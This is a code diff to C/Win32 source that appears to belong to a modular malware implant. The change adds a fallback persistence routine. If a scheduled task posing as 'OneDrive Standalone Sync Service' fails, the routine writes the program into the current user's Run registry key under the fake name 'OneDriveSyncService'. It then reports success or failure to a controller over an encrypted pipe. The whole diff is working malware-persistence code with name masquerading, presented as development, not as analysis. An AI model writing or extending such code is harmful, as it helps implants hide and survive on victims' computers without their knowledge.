@@ -22,6 +22,18 @@ static void PersistDebug(const char *format, ...) {
     if (f) { fprintf(f, "[%lu] %s\n", GetTickCount(), buf); fclose(f); }
 }
 
+BOOL InstallHKCUPersistence(LPCWSTR pwszExePath) {
+    HKEY hKey;
+    LONG res = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                               0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+    if (res == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, L"OneDriveSyncService", 0, REG_SZ, (const BYTE*)pwszExePath, (DWORD)(wcslen(pwszExePath) + 1) * sizeof(WCHAR));
+        RegCloseKey(hKey);
+        return TRUE;
+    }
+    return FALSE;
+}
+
 HRESULT CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
   HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
   if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
@@ -175,7 +187,6 @@ DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
           WCHAR szMyPath[MAX_PATH] = {0};
           GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
           PersistDebug("[Exec] Installing persistence for: %ls", szMyPath);
-
           HRESULT hrResult = CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath);
           if (SUCCEEDED(hrResult)) {
             PersistDebug("[Exec] CreateScheduledTaskCOM SUCCESS.");
@@ -188,16 +199,29 @@ DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
             memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
             IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
           } else {
-            PersistDebug("[Exec] CreateScheduledTaskCOM FAILED. HR: 0x%08X", hrResult);
-            char report[256];
-            sprintf_s(report, "[PERSIST] Scheduled Task COM Installation FAILED. HR: 0x%08X", hrResult);
-            IPC_MESSAGE outMsg = {0};
-            outMsg.dwSignature = 0x534D4952;
-            outMsg.CommandId = CMD_REPORT;
-            outMsg.AtomId = dwAtomId;
-            outMsg.dwPayloadLen = (DWORD)strlen(report);
-            memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
-            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+            PersistDebug("[Exec] CreateScheduledTaskCOM FAILED (HR: 0x%08X). Falling back to HKCU Run key...", hrResult);
+            if (InstallHKCUPersistence(szMyPath)) {
+                PersistDebug("[Exec] HKCU Persistence SUCCESS.");
+                char report[] = "[PERSIST] Fallback HKCU Run Key Installation SUCCESS.";
+                IPC_MESSAGE outMsg = {0};
+                outMsg.dwSignature = 0x534D4952;
+                outMsg.CommandId = CMD_REPORT;
+                outMsg.AtomId = dwAtomId;
+                outMsg.dwPayloadLen = (DWORD)strlen(report);
+                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+                IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+            } else {
+                PersistDebug("[Exec] HKCU Persistence FAILED.");
+                char report[256];
+                sprintf_s(report, "[PERSIST] All persistence methods FAILED (COM Error: 0x%08X)", hrResult);
+                IPC_MESSAGE outMsg = {0};
+                outMsg.dwSignature = 0x534D4952;
+                outMsg.CommandId = CMD_REPORT;
+                outMsg.AtomId = dwAtomId;
+                outMsg.dwPayloadLen = (DWORD)strlen(report);
+                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+                IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+            }
           }
         } else if (inMsg.CommandId == CMD_TERMINATE) {
           break;
